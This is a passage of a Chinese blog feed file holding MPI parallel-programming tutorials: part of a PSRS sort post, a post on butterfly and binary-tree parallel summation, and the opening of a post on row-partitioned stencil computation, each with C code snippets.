class="hljs-type">void</span> *recvbuf,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-type">int</span> *recvcounts, <span class="hljs-type">const</span> <span class="hljs-type">int</span> *rdispls, MPI_Datatype recvtype,</span><br><span class="hljs-params">                  MPI_Comm comm)</span><br></code></pre></td></tr></table></figure><p>该函数的功能是，让每个处理器发送一个消息给所有处理器（包括自己），这些消息都在它的发送缓冲中以处理器标识符号的顺序有序地存放。如下图所示，每个处理器都从所有处理器接收到一个消息，并以标号的顺序存放在缓冲区中。</p><center>   <img src="/img/PP/Alltoall.png" /></center><p>回到本次实现，不难发现，对$ W^j_i $ 的操作，就是全局交换，与 <code>MPI_Alltoall</code> 函数所描述的功能完全一致。那么紧接着的一个问题是，如何编码呢？</p><p>首先，明确一个坏消息：$ W^j_i $ 的长度都是不定的，且只有本地的处理器知道它的长度。这意味着，在直接使用 <code>MPI_Alltoallv</code> 函数来完成全局交换之前，所有处理器还需要<strong>全局交换每个数据段的长度</strong>:scream: 。否则，我无法赋值 <code>MPI_Alltoallv</code> 函数中的各个数组值。好在，这部分代码很简单，就当做正式作战之前的一次热身吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 发送各个段的长度</span><br><span class="hljs-type">int</span> rcounts[num_procs];<br>MPI_Alltoall(pcounts, <span class="hljs-number">1</span>, MPI_INT, rcounts, <span class="hljs-number">1</span>, MPI_INT, MPI_COMM_WORLD);<br></code></pre></td></tr></table></figure><p>现在，每个处理器都已经知道了自己要发多长的消息，也知道了自己要收多长的消息。还需要知道，这些消息在哪，也就是它们的偏移量是什么。其实也简单，毕竟一个紧挨着一个，只要根据长度累加起来就可以。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 计算位移</span><br><span class="hljs-type">int</span> rdispls[num_procs];<br>sdispls[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; rdispls[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>;i &lt; num_procs;i++) &#123;<br>    sdispls[i] = sdispls[i<span class="hljs-number">-1</span>] + pcounts[i<span class="hljs-number">-1</span>];<br>    rdispls[i] = rdispls[i<span class="hljs-number">-1</span>] + rcounts[i<span class="hljs-number">-1</span>];<br>&#125;<br><span class="hljs-comment">// 计算总长度</span><br><span class="hljs-type">int</span> totalcounts = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; num_procs; i++)<br>    totalcounts += rcounts[i];<br></code></pre></td></tr></table></figure><p>然后，就是创造一个接收缓冲区，并调用函数，归并排序！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *b = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(totalcounts*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-comment">// 每个处理器发送数据给其他所有处理器，且每个处理发送的数据长度都不同</span><br><span class="hljs-comment">// 故有长度数组和位移数组</span><br>MPI_Alltoallv(a, pcounts, sdispls, MPI_INT, b, rcounts, rdispls, MPI_INT, MPI_COMM_WORLD);<br><span class="hljs-comment">// 归并排序</span><br>merge_sort(b, <span class="hljs-number">0</span>, totalcounts<span class="hljs-number">-1</span>);<br></code></pre></td></tr></table></figure><h3 id="收集数组">收集数组</h3><p>现在，排序任务已经完成，只剩接收工作了。</p><p>回想一下，MPI 是如何收集数据的？使用 <code>MPI_Gather</code> 函数！注意到，<code>Proc#0</code> 不清楚各处理器中到底有多少有序元素。所以说，还是和上一小节一样，需要先收集各处理器中数组的长度。正所谓，兵马未动粮草先行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">MPI_Gather(&amp;totalcounts, <span class="hljs-number">1</span>, MPI_INT, rcounts, <span class="hljs-number">1</span>, MPI_INT, <span class="hljs-number">0</span>, MPI_COMM_WORLD);<br></code></pre></td></tr></table></figure><p>然后，根据得到的长度，计算偏移量，再使用 <code>MPI_Gatherv</code> 函数（这里为方便，复用了一些之前定义的数组）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">rdispls[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt; num_procs; i++)<br>    rdispls[i] = rdispls[i<span class="hljs-number">-1</span>] + rcounts[i<span class="hljs-number">-1</span>];<br>MPI_Gatherv(b, totalcounts, MPI_INT, result, rcounts, rdispls, MPI_INT, <span class="hljs-number">0</span>, MPI_COMM_WORLD);<br></code></pre></td></tr></table></figure><p>于是，现在所有的有序数组都存放在 <code>result</code> 数组中了 :smile:。</p><h2 id="复杂度分析">复杂度分析</h2><p>完成了 PSRS 排序的实现后，我简单地讨论一下 PSRS 算法的复杂度。在第一部分的快速排序中，时间复杂度为$ O(k \log k)，k=n/p <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>。然后，各处理器选择</mtext><mi>p</mi><mo>−</mo><mn>1</mn><mtext>个代表元素，代价为</mtext></mrow><annotation encoding="application/x-tex">。然后，各处理器选择 p-1 个代表元素，代价为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">。然后，各处理器选择</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">个代表元素，代价为</span></span></span></span> O(p) <span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;#&#039; at position 10: 。再由 `Proc#̲0` 对所有送来的代表元素进行…'>。再由 `Proc#0` 对所有送来的代表元素进行排序，然后选出主元，这里若使用快速排序，代价为</span> O(p^2 \log p^2) <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，而若使用归并排序，则所需代价为</mtext></mrow><annotation encoding="application/x-tex">，而若使用归并排序，则所需代价为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">，而若使用归并排序，则所需代价为</span></span></span></span> O(p^2) <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>。每个处理器接收到主元后，再对有序数组进行划分，代价为</mtext></mrow><annotation encoding="application/x-tex">。每个处理器接收到主元后，再对有序数组进行划分，代价为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">。每个处理器接收到主元后，再对有序数组进行划分，代价为</span></span></span></span> O(k+p) <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，最后，各个处理器全局交换，并行归并排序，代价为</mtext></mrow><annotation encoding="application/x-tex">，最后，各个处理器全局交换，并行归并排序，代价为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">，最后，各个处理器全局交换，并行归并排序，代价为</span></span></span></span> O(k+\log p) $。考虑到实际应用中，需要排序的数据长度 n 一定远远多于现有的处理器 p，此时可以视 p 为一个小常数，那么 PSRS 排序算法的时间复杂度，就可以简化为 $ O(k\log k+k) $。</p><p>从消息复杂度的角度看，<code>Proc#0</code> 收集代表元素，并播送主元的复杂度为 $ O(p^2+p) $。在全局交换部分的消息复杂度与具体算法实现相关，但其最大值不会超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><h2 id="总结">总结</h2><p>PSRS 排序过程复杂，编写 MPI 容易出错。在实现时，建议尽量地借助<strong>群集通信</strong>的相关函数，可以有效地减少代码量，减少错误，增强代码的可读性。同时，借助这次对 PSRS 排序的实现，提高对这些群集通信函数的熟练度，因此作为一个练手项目，是一个不错的选择。</p><p>博主本人的实现见<a href="https://github.com/dingfen/ParallelComputing/blob/master/sort/psrs_sort.c">PSRS排序</a>。</p><head>    <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>    <script type="text/x-mathjax-config">        MathJax.Hub.Config({            tex2jax: {            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],            inlineMath: [['$','$']]            }        });    </script></head>]]></content>
    
    
    <categories>
      
      <category>Parallel Computing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MPI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>并行程序中的求和</title>
    <link href="/2020/12/17/2020-12-17-PP02/"/>
    <url>/2020/12/17/2020-12-17-PP02/</url>
    
    <content type="html"><![CDATA[<h1>并行求和算法实现</h1><h2 id="题目描述">题目描述</h2><p>有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个处理器，现对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个数求和，要求每个处理器中都保持全和。有两个算法可以实现：</p><ul><li>蝶式求和算法：重复计算元素的求和，共需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">logN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 步。在每个阶段，处理器都会将数据发给指定的其他处理器，然后进行求和。</li><li>二叉树求和算法，累计求和，在广播给其他节点，需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">2logN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 步</li></ul><h2 id="蝶式算法实现">蝶式算法实现</h2><p>首先需要假定：数据均匀地分布在每一个处理器中，特别地，每个处理器中只有一个数字。但求和必然要求<strong>所有的数据</strong>，蝶式算法就是将数据从少到多，一步一步地累加起来。编程时，可按照蝶式算法一步一步按阶段地实现。接下来，对照下图，仔细地品读一下算法，了解其中的规律，以便代码实现。</p><center>    <img src="/img/PP/dieshi.png"/></center><p>在第一阶段，每个处理器与其相邻的处理器交换它们的数据。注意一下它们的编号：<code>Proc#0</code> 和 <code>Proc#1</code> ，<code>Proc#2</code> 和 <code>Proc#3</code>，……如果我们把这些编号全部写成二进制，规律就更加明显了😄。这些互相交流的处理器的编号，除了倒数第一位是不一致的，其他都是一致的！</p><p>第二个阶段，处理器0与2号处理器交流，1号与3号交流，4号与6号交流……在二进制表示中，也是只有一个位的差别，这里是倒数第二位。第三阶段，0号处理器与4号交流，是倒数第三位的差别。</p><p>得到规律：在第 <code>i</code> 个阶段，处理器 <code>Proc#n</code> 会与处理器 <code>Proc#(n ^ (1 &lt;&lt; (i-1)))</code> 交换数据（发送和接收都要），然后相加就行了😆 。如此一来，代码就呼之欲出了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= num_procs; i &lt;&lt;= <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-type">int</span> tag = i &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> dest = id_procs ^ tag;<br>    MPI_Send(&amp;data, <span class="hljs-number">1</span>, MPI_INT, dest, tag, MPI_COMM_WORLD);<br>    MPI_Recv(&amp;recvdata, <span class="hljs-number">1</span>, MPI_INT, dest, tag, MPI_COMM_WORLD, &amp;status);<br>    data += recvdata;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二叉树求和实现">二叉树求和实现</h2><p>二叉树求和的过程非常好理解：先将相邻的处理器数据收集起来，求和后再次重复，直到求出总和，最后沿着二叉树的路径将求和结果往下传导。</p><center>    <img src="/img/PP/ercha.png" /></center><p>虽然二叉树求和算法的实现相较于蝶式求和更容易理解，但实现起来却相对吃力，并且还会更加耗时。因为它还要求将数据从根部传下来，多了一个要实现的阶段。</p><p>还是找规律，第一个阶段，0号处理器与1号处理器相加，<code>Proc#2</code> 与 <code>Proc#3</code>  相加，我假设求和后的数据都存放在较小编号的处理器中，那么第二阶段，就是 <code>Proc#0</code> 与 <code>Proc#2</code>  相加，第三阶段（如果有的话），就是 <code>Proc#0</code> 与<code>Proc#4</code>  相加。同样从二进制入手，找到如下规律：**在第 <code>i</code> 个阶段，相互之间通信的处理器中仅第 <code>i</code> 位不一致。**还需要注意的是，编号较小的处理器接收数据，较大的发送数据。好，现在理解计算这部分代码就没有难度了 :yum:。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= num_procs; i &lt;&lt;= <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-type">int</span> tag = i &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> diff = id_procs &amp; tag;<br>    <span class="hljs-keyword">if</span> (diff) &#123;<br>        MPI_Send(&amp;data, <span class="hljs-number">1</span>, MPI_INT, id_procs-tag, tag, MPI_COMM_WORLD);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        MPI_Recv(&amp;recvdata, <span class="hljs-number">1</span>, MPI_INT, id_procs+tag, tag, MPI_COMM_WORLD, &amp;status);<br>    &#125;<br>    data += recvdata;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是将 <code>Proc#0</code> 处理器中的计算结果分发给其他处理器。当然，使用 <code>MPI_Bcast()</code> 函数直接将数据广播出去会更加方便，但是这样做不符合算法的要求 :man_shrugging:。我们需要弄清楚两点：哪一个处理器接收？哪一个处理器发送？第一步，当然是 <code>Proc#0</code> 处理器发送，让 <code>Proc#N/2</code> 处理器接收。第二步，<code>Proc#0</code> 与 <code>Proc#N/4</code> 通信，<code>Proc#N/2</code>与 <code>Proc#3N/4</code> 通信……emm，看起来我们需要拿出纸笔，好好算一算。每次发送/接收消息，处理器编号的差都是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">i/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mord">/2</span></span></span></span>，而且只有编号是 i 的倍数的处理器才能发送消息。把循环变量当做处理器总数，并每次除 2，可以方便我们对处理器编号的计算。</p><center>    <img src="/img/PP/jisuan.png" /></center><p>计算完后，在编写代码，就可以一步到位，省去了很多调试的烦恼！如果大家没看懂代码，或许上图可以帮助大家理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = num_procs; i &gt;= <span class="hljs-number">2</span>; i &gt;&gt;= <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-type">int</span> tag = i;<br>    <span class="hljs-keyword">if</span> (id_procs % i == <span class="hljs-number">0</span>) &#123;<br>        MPI_Send(&amp;data, <span class="hljs-number">1</span>, MPI_INT, id_procs+(i&gt;&gt;<span class="hljs-number">1</span>), tag, MPI_COMM_WORLD);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(id_procs % (i &gt;&gt; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;<br>         MPI_Recv(&amp;data, <span class="hljs-number">1</span>, MPI_INT, id_procs-(i&gt;&gt;<span class="hljs-number">1</span>), tag, MPI_COMM_WORLD, &amp;status);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所有算法的代码实现请见我的 <a href="https://github.com/dingfen/ParallelComputing/tree/master/PP_02">github仓库</a></p><head>    <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>    <script type="text/x-mathjax-config">        MathJax.Hub.Config({            tex2jax: {            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],            inlineMath: [['$','$']]            }        });    </script></head>]]></content>
    
    
    <categories>
      
      <category>Parallel Computing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MPI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对一并行程序实验的简单理解</title>
    <link href="/2020/12/14/2020-12-14-PP01/"/>
    <url>/2020/12/14/2020-12-14-PP01/</url>
    
    <content type="html"><![CDATA[<h1>对一并行程序实验的简单理解</h1><h2 id="写在前面">写在前面</h2><h3 id="使用一维数组">使用一维数组</h3><p>在写并行程序时，会遇到很多针对<strong>矩阵</strong>、<strong>张量</strong>的计算，尽管它们都是以<strong>多维数组</strong>的方式组合在一起，但一般情况下，<u>我更加倾向于使用一维数组来表示这些多维数组的数据</u>。我认为，这样做的好处有：</p><ol><li>方便函数参数类型的统一。如果程序中既声明了二维数组（这意味着它是一个 pointer to pointer 的类型），又存在一维数组，那么在调用函数时（比如需要生成随机数据，或者检查运行结果是否正确），会出现类型不一致，就需要实现两个功能类似的函数，增加了代码冗余。当然了，这里我们只讨论 C 语言的情况 :sweat:。</li><li>方便索引的计算。计算偏移量是并行编程中常做的事情，然而在多维数组中，指针偏移是很容易出错且吃力的事情（很多时候单看 <code>p+1</code> 你甚至不知道指针到底偏移了多少！）。而如果全部使用一维数组，偏移的量就很容易理解，你再也不会被多维指针搞得晕头转向:smile:。</li><li>更接近机器底层。对计算机系统稍做了解，就会发现所谓的“多维数组”其实是程序员抽象出来的东西，计算机真正认识的只有一维数组。使用一维数组写并行程序，不仅对 MPI 更加友好（大部分 MPI 函数只接受一维指针），还会更有助于我们理解机器行为，挖掘并行潜力。</li></ol><p>使用一维数组虽然有如上好处，但也有明显的弊端：索引表达不方便。当然也有办法可以解决这些问题：</p><ol><li><p>使用宏函数。注意一定要给每个运算部分加上括号。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> INDEX(i, j) (((i)*(N))+(j))</span><br></code></pre></td></tr></table></figure></li><li><p>如果你对宏函数嗤之以鼻，那么可以使用 <code>inline</code> 函数代替宏函数，性能不会降低且更加安全。</p></li></ol><h3 id="使用堆空间并注意内存泄露">使用堆空间并注意内存泄露</h3><p>并行编程往往涉及非常大的数据量，因此推荐将数据放入堆空间中。不过，这会带来一个非常棘手的问题：内存泄露。C 语言中没有自动的内存回收工具，内存能不能被回收利用全靠程序员自觉，但良好的编程习惯和适当的技巧可以尽可能地避免这类问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br>  <span class="hljs-comment">// 分配堆空间</span><br>  pa = <span class="hljs-built_in">malloc</span>(N);<br>    <span class="hljs-comment">// 若失败 break 退出</span><br>    <span class="hljs-keyword">if</span> (pa==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">break</span>;<br>&#125;<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (pa!=<span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">free</span>(pa);<br>pa = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用循环 <code>do ... while(0)</code> 将程序主体包裹起来，这样一旦分配内存出错就可以直接 <code>break</code> 跳出来，然后将其释放掉。还避免使用了 <code>goto</code> 语句。另外需要注意的是，释放内存前一定要检查指针是否已经指向 <code>NULL</code> ，这可避免二次释放造成的运行时错误。</p><h3 id="使用串行程序进行验算">使用串行程序进行验算</h3><p>使用串行程序检验最终计算结果对并行编程的重要性不言而喻。但在调试时，串行程序也可以贡献出自己的一份力量。若遇到复杂的程序设计，可能需要分步完成程序，每一步都用串行程序验证正确性。稳扎稳打，步步为营才是王道。</p><h2 id="题目描述">题目描述</h2><p>矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 均为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>×</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">N \times N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 的双精度矩阵，现有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> 个处理器，针对以下程序片段，分别采用<u>按行块连续划分</u>和<u>棋盘划分</u>的方式，给出相应的 MPI 程序实现。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; N<span class="hljs-number">-1</span>; i++)<br>    <span class="hljs-keyword">for</span>(j = <span class="hljs-number">1</span>; j &lt; N<span class="hljs-number">-1</span>; j++)<br>        B[i][j] = (A[i<span class="hljs-number">-1</span>][j]+A[i][j<span class="hljs-number">-1</span>]+A[i+<span class="hljs-number">1</span>][j]+A[i][j<span class="hljs-number">-1</span>]) / <span class="hljs-number">4.0</span>;<br></code></pre></td></tr></table></figure><h2 id="按行连续划分">按行连续划分</h2><h3 id="方法概要">方法概要</h3><p>按行连续划分，即将矩阵以<strong>行</strong>为单位分割，并交给不同的处理器进行处理。下图就是我们对矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 行连续划分的示意图。除主处理器外，每个处理器轮流地取出连续的三行。在程序一开始，假设只有0号处理器拥有所有的数据。</p><center><img src="/img/PP/lines.png" /></center><p>我们的程序需要完成以下步骤：</p><ol><li>在某个处理器中生成随机数据。为了计算的方便，我假设编号最大的处理器中握有数据，并且还负责最后结果的汇总。</li><li>将生成的随机数据分发给不同的处理器。从上面的程序片段中看出，计算一个矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 元素需要三行的矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 元素，因此至少需要给一个处理器三行数据。</li><li>各个处理器完成自己的任务。</li><li>将计算好的结果从各个处理器发出，由主处理器收集整理。</li></ol><h3 id="细节处理">细节处理</h3><p>细节决定成败，这对并行编程来说尤为如此。特别地，需要注意</p><ul><li>从处理器会接到多个来自主处理器的数据，必须要用明确的标签区分这些数据。</li><li>处理好余数情况，某几个从处理器收到的数据可能会比其他从处理器多一个，需要一个私有变量记录处理器需要计算多少行矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。当然，也可以采用对矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 补 0 对齐的方法</li><li>收集计算结果时，要将起点定在矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的（1，1）中，还要弄清楚到底哪一行计算结果存放在哪一个处理器中。</li><li>时刻注意索引的计算</li></ul><h3 id="部分代码解析">部分代码解析</h3><p>先是程序的初始化和随机生成数据，并串行地执行计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 